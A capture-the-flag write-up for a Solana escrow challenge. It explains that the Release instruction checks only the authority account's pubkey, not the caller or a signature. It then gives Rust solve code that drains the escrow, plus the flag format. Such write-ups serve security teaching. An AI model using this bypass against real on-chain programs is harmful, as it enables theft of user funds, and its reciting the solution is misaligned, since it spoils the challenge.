# Escrow Bypass

**Category:** Blockchain (Solana)  **Difficulty:** Hard  **Author:** AbuCTF

> An escrow program holds 50 SOL for controlled release. The release function is protected by an authority program requirement. Players start with 5 SOL and must steal at least 45 SOL from the escrow to capture the flag.

Handout: `dist/` (program and server source, empty `solve/` template, Dockerfile). Run: `cd challenge && docker compose up --build`, then connect to port 5005.

## Solution

The banner gives us the escrow program ID, the escrow PDA, and tells us we are already the recipient. The escrow just hasn't been released yet, and `Release` is supposed to only be callable by the "authority program".

Looking at `process_release`, the authorization is this:

```rust
if escrow_data.authority_program != *authority_program.key {
    msg!("Unauthorized program");
    return Err(ProgramError::InvalidAccountData);
}
```

It only checks that the third account we pass has the right pubkey. Nothing checks that this program is actually the caller, or that the account signed anything. And `Initialize` stores `authority_program: *program_id`, i.e. the escrow program itself, which the banner hands to us.

So the solve program calls `Release` directly and passes the escrow program ID as the "authority":

```rust
let ix = Instruction {
    program_id: *escrow_program.key,
    accounts: vec![
        AccountMeta::new(*escrow_pda.key, false),
        AccountMeta::new(*user_account.key, false),            // recipient, that's us
        AccountMeta::new_readonly(*escrow_program.key, false),  // "authority"
    ],
    data: EscrowInstruction::Release.try_to_vec().unwrap(),
};
invoke(&ix, &[escrow_pda.clone(), user_account.clone(), escrow_program.clone()])?;
```

```bash
./build.sh
python3 solve.py <host> 5005
```

The 50 SOL lands in our account, which clears the 45 SOL threshold and the server prints the flag.

Flag is per instance: `H7CTF{cp1_auth_byp4ss_n0_s1gn3r_ch3ck_<uuid>}`
